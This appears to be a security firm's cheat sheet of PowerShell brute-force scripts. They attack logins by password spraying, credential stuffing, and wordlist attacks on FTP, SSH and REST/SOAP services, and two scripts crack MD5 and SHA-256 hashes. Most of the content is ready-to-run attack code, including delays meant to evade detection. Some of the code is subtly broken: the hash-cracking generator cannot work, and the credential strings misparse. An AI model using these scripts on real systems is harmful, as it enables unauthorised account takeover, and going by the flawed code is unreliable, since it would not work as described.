### General Brute Forcing with PowerShell

**Script/Command:**

```powershell
$passwords = Get-Content "passwords.txt"
$username = "root"
$target = "snowcapcyber.com"
foreach ($password in $passwords) {
    $credentials = New-Object PSCredential -ArgumentList ($username, (ConvertTo-SecureString -AsPlainText $password -Force))
    # Attempt login using $credentials against $target
    # Use Test-Credential cmdlet to validate
    # Perform additional actions based on the response
}
```

**Description:**

Automates the process of attempting different password combinations for a given username against a target, reading passwords from a file.

**Example:**

Test passwords from passwords.txt for username "root" against snowcapcyber.com.

---

**Script/Command:**

```powershell
$credentials = Get-Content "credentials.txt" | ConvertTo-SecureString
$target = "snowcapcyber.com"
foreach ($credential in $credentials) {
    # Attempt login using $credential against $target
    # Perform additional actions based on the response
}
```

**Description:**

Automates credential stuffing by attempting previously compromised username-password pairs from a file against a target service.

**Example:**

Test credential pairs from credentials.txt against snowcapcyber.com.

---

**Script/Command:**

```powershell
$passwords = Get-Content "wordlist.txt"
$username = "admin"
$target = "snowcapcyber.com"
$delaySeconds = 2
foreach ($password in $passwords) {
    $credentials = New-Object PSCredential -ArgumentList ($username, (ConvertTo-SecureString -AsPlainText $password -Force))
    # Attempt login using $credentials against $target
    Start-Sleep -Seconds $delaySeconds
    # Perform additional actions based on the response
}
```

**Description:**

Incorporates rate limiting by adding delays between login attempts to avoid detection, using a wordlist for dictionary attacks.

**Example:**

Test passwords from wordlist.txt for username "admin" against snowcapcyber.com with a 2-second delay.

---

### Brute Forcing FTP Using PowerShell

**Script/Command:**

```powershell
$usernames = Get-Content "usernames.txt"
$passwords = Get-Content "passwords.txt"
$ftpServer = "ftp.snowcapcyber.com"
$ftpPort = 21
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        $credentials = New-Object PSCredential -ArgumentList ($username, (ConvertTo-SecureString -AsPlainText $password -Force))
        $ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://${ftpServer}:${ftpPort}")
        $ftpRequest.Credentials = $credentials
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
        try {
            $ftpResponse = $ftpRequest.GetResponse()
            Write-Host "Login successful: $username:$password"
            # Perform additional actions based on a successful login
        } catch [System.Net.WebException] {
            $errorMessage = $_.Exception.Message
            Write-Host "Login failed: $username:$password - $errorMessage"
        }
    }
}
```

**Description:**

Automates brute-force login attempts for an FTP server by iterating through username and password combinations.

**Example:**

Test all combinations of usernames from usernames.txt and passwords from passwords.txt against ftp.snowcapcyber.com.

---

**Script/Command:**

```powershell
$usernames = Get-Content "usernames.txt"
$passwords = Get-Content "passwords.txt"
$ftpServer = "ftp.snowcapcyber.com"
$ftpPort = 21
$delaySeconds = 2
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        $credentials = New-Object PSCredential -ArgumentList ($username, (ConvertTo-SecureString -AsPlainText $password -Force))
        $ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://${ftpServer}:${ftpPort}")
        $ftpRequest.Credentials = $credentials
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
        try {
            $ftpResponse = $ftpRequest.GetResponse()
            $responseCode = [int]$ftpResponse.StatusCode
            if ($responseCode -ge 200 -and $responseCode -lt 300) {
                Write-Host "Login successful: $username:$password"
                # Perform additional actions
            } else {
                Write-Host "Login failed: $username:$password - Response code: $responseCode"
            }
        } catch [System.Net.WebException] {
            $errorMessage = $_.Exception.Message
            Write-Host "Login failed: $username:$password - $errorMessage"
        }
        Start-Sleep -Seconds $delaySeconds
    }
}
```

**Description:**

Handles FTP server responses and includes delays to avoid rate limiting, interpreting response codes for success or failure.

**Example:**

Test login attempts on ftp.snowcapcyber.com with a 2-second delay, logging response codes.

---

**Script/Command:**

```powershell
$usernames = Get-Content "usernames.txt"
$passwords = Get-Content "passwords.txt"
$ftpServer = "ftp.snowcapcyber.com"
$ftpPort = 21
$logFile = "bruteforce_log.txt"
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        $credentials = New-Object PSCredential -ArgumentList ($username, (ConvertTo-SecureString -AsPlainText $password -Force))
        $ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://${ftpServer}:${ftpPort}")
        $ftpRequest.Credentials = $credentials
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
        try {
            $ftpResponse = $ftpRequest.GetResponse()
            $responseCode = [int]$ftpResponse.StatusCode
            if ($responseCode -ge 200 -and $responseCode -lt 300) {
                Write-Output "$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss')) - Successful login: $username:$password" | Out-File -Append -FilePath $logFile
            } else {
                Write-Output "$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss')) - Failed login: $username:$password - Response code: $responseCode" | Out-File -Append -FilePath $logFile
            }
        } catch [System.Net.WebException] {
            $errorMessage = $_.Exception.Message
            Write-Output "$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss')) - Failed login: $username:$password - $errorMessage" | Out-File -Append -FilePath $logFile
        }
    }
}
```

**Description:**

Implements logging to record the results of FTP brute-force attempts, including timestamps and response details.

**Example:**

Log all login attempts for ftp.snowcapcyber.com to bruteforce_log.txt.

---

### Brute Forcing SSH Using PowerShell

**Script/Command:**

```powershell
$usernames = Get-Content "usernames.txt"
$passwords = Get-Content "passwords.txt"
$sshServer = "ssh.snowcapcyber.com"
$sshPort = 22
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        $sshCommand = "sshpass -p '$password' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $sshPort $username@$sshServer"
        try {
            Invoke-Expression -Command $sshCommand
            Write-Host "Login successful: $username:$password"
            # Perform additional actions based on a successful login
        } catch {
            Write-Host "Login failed: $username:$password - $_"
        }
    }
}
```

**Description:**

Automates brute-force login attempts for an SSH server by iterating through username and password combinations using sshpass.

**Example:**

Test all combinations of usernames from usernames.txt and passwords from passwords.txt against ssh.snowcapcyber.com.

---

**Script/Command:**

```powershell
$usernames = Get-Content "usernames.txt"
$passwords = Get-Content "passwords.txt"
$sshServer = "ssh.snowcapcyber.com"
$sshPort = 22
$delaySeconds = 2
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        $sshCommand = "sshpass -p '$password' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $sshPort $username@$sshServer"
        try {
            Invoke-Expression -Command $sshCommand
            Write-Host "Login successful: $username:$password"
            # Perform additional actions
        } catch {
            $errorMessage = $_.Exception.Message
            Write-Host "Login failed: $username:$password - $errorMessage"
        }
        Start-Sleep -Seconds $delaySeconds
    }
}
```

**Description:**

Includes delays between SSH login attempts to avoid detection and mitigate rate limiting.

**Example:**

Test login attempts on ssh.snowcapcyber.com with a 2-second delay.

---

**Script/Command:**

```powershell
$usernames = Get-Content "usernames.txt"
$passwords = Get-Content "passwords.txt"
$sshServer = "ssh.snowcapcyber.com"
$sshPort = 22
$logFile = "bruteforce_log.txt"
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        $sshCommand = "sshpass -p '$password' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $sshPort $username@$sshServer"
        try {
            Invoke-Expression -Command $sshCommand
            if ($?) {
                Write-Output "$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss')) - Successful login: $username:$password" | Out-File -Append -FilePath $logFile
            }
        } catch {
            Write-Output "$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss')) - Failed login: $username:$password - $_" | Out-File -Append -FilePath $logFile
        }
    }
}
```

**Description:**

Implements logging to record SSH brute-force results, including successful and failed attempts with timestamps.

**Example:**

Log all login attempts for ssh.snowcapcyber.com to bruteforce_log.txt.

---

### Brute Forcing Web Services Using PowerShell

**Script/Command:**

```powershell
$usernames = Get-Content "usernames.txt"
$passwords = Get-Content "passwords.txt"
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        $base64Auth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("${username}:${password}")))
        $headers = @{ Authorization = "Basic $base64Auth" }
        $response = Invoke-RestMethod -Uri "https://api.example.com/resource" -Method Get -Headers $headers
        if ($response.Status -eq "success") {
            Write-Host "Login successful: $username:$password"
            # Perform additional actions
        } else {
            Write-Host "Login failed: $username:$password"
        }
    }
}
```

**Description:**

Performs brute-force attacks on a REST web service using basic authentication.

**Example:**

Test all username-password combinations from usernames.txt and passwords.txt against https://api.example.com/resource.

---

**Script/Command:**

```powershell
$usernames = Get-Content "usernames.txt"
$passwords = Get-Content "passwords.txt"
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        # Obtain the token using the credentials (placeholder function)
        $token = Get-AuthToken -Username $username -Password $password
        $headers = @{ Authorization = "Bearer $token" }
        $response = Invoke-RestMethod -Uri "https://api.snowcapcyber.com/resource" -Method Get -Headers $headers
        if ($response.Status -eq "success") {
            Write-Host "Login successful: $username:$password"
            # Perform additional actions
        } else {
            Write-Host "Login failed: $username:$password"
        }
    }
}
```

**Description:**

Performs brute-force attacks on a REST web service using token-based authentication (requires a token retrieval function).

**Example:**

Test token-based authentication for https://api.snowcapcyber.com/resource.

---

**Script/Command:**

```powershell
$usernames = Get-Content "usernames.txt"
$passwords = Get-Content "passwords.txt"
$delaySeconds = 2
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        $soapEnvelope = @"<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:web='http://www.snowcapcyber.com/webservice'>
<soapenv:Header/>
<soapenv:Body>
<web:Authenticate>
    <web:Username>$username</web:Username>
    <web:Password>$password</web:Password>
</web:Authenticate>
</soapenv:Body>
</soapenv:Envelope>"@
        $response = Invoke-WebRequest -Uri "https://api.example.com/webservice" -Method Post -Body $soapEnvelope -ContentType "text/xml"
        if ($response.StatusCode -eq 200) {
            Write-Host "Login successful: $username:$password"
            # Perform additional actions
        } else {
            Write-Host "Login failed: $username:$password"
        }
        Start-Sleep -Seconds $delaySeconds
    }
}
```

**Description:**

Performs brute-force attacks on a SOAP web service with XML-based authentication, including delays to avoid rate limiting.

**Example:**

Test SOAP authentication for https://api.example.com/webservice with a 2-second delay.

---

**Script/Command:**

```powershell
$usernames = Get-Content "usernames.txt"
$passwords = Get-Content "passwords.txt"
$logFile = "snowcap_bruteforce_log.txt"
foreach ($username in $usernames) {
    foreach ($password in $passwords) {
        $base64Auth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("${username}:${password}")))
        $headers = @{ Authorization = "Basic $base64Auth" }
        $response = Invoke-RestMethod -Uri "https://api.example.com/resource" -Method Get -Headers $headers
        if ($response.Status -eq "success") {
            Write-Output "$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss')) - Successful login: $username:$password" | Out-File -Append -FilePath $logFile
        } else {
            Write-Output "$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss')) - Failed login: $username:$password" | Out-File -Append -FilePath $logFile
        }
    }
}
```

**Description:**

Implements logging for web service brute-force attempts, recording success or failure with timestamps.

**Example:**

Log all attempts for https://api.example.com/resource to snowcap_bruteforce_log.txt.

---

### Brute Forcing a Hash Using PowerShell

**Script/Command:**

```powershell
$hashToCrack = "5d41402abc4b2a76b9719d911017c592" # Example MD5 hash ("hello")
$charset = 1..26 + 65..90 + 97..122  # ASCII values for lowercase and uppercase letters
function ConvertTo-String($array) {
    [System.Text.Encoding]::ASCII.GetString($array)
}
function Generate-BruteForceStrings {
    param (
        [int]$length,
        [int]$charset
    )
    $bruteForceStrings = @()
    $charsetLength = $charset.Length
    1..$length | ForEach-Object {
        $bruteForceStrings += [char]$charset[$_.GetHashCode() % $charsetLength]
    }
    return ConvertTo-String $bruteForceStrings
}
for ($length = 1; $length -le 4; $length++) {
    $bruteForceString = Generate-BruteForceStrings -length $length -charset $charset
    $hashAttempt = [System.Security.Cryptography.HashAlgorithm]::Create("MD5").ComputeHash([System.Text.Encoding]::ASCII.GetBytes($bruteForceString))
    if ($hashToCrack -eq ($hashAttempt | ForEach-Object { $_.ToString("x2") } -join '')) {
        Write-Host "Hash cracked! Plaintext: $bruteForceString"
        break
    }
}
Write-Host "Brute-forcing completed."
```

**Description:**

Performs a basic brute-force attack to crack an MD5 hash by generating strings and comparing their hashes.

**Example:**

Attempt to crack the MD5 hash "5d41402abc4b2a76b9719d911017c592" (corresponding to "hello").

---

**Script/Command:**

```powershell
$hashToCrack = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" # Example SHA256 hash ("")
$charset = 1..26 + 65..90 + 97..122
function ConvertTo-String($array) {
    [System.Text.Encoding]::ASCII.GetString($array)
}
function Generate-BruteForceStrings {
    param (
        [int]$length,
        [int]$charset
    )
    $bruteForceStrings = @()
    $charsetLength = $charset.Length
    1..$length | ForEach-Object {
        $bruteForceStrings += [char]$charset[$_.GetHashCode() % $charsetLength]
    }
    return ConvertTo-String $bruteForceStrings
}
for ($length = 1; $length -le 4; $length++) {
    $bruteForceString = Generate-BruteForceStrings -length $length -charset $charset
    $hashAttempt = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::ASCII.GetBytes($bruteForceString))
    if ($hashToCrack -eq ($hashAttempt | ForEach-Object { $_.ToString("x2") } -join '')) {
        Write-Host "Hash cracked! Plaintext: $bruteForceString"
        break
    }
}
Write-Host "Brute-forcing completed."
```

**Description:**

Customizes the hash brute-force script for SHA-256 hashes.

**Example:**

Attempt to crack the SHA256 hash "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" (corresponding to an empty string).
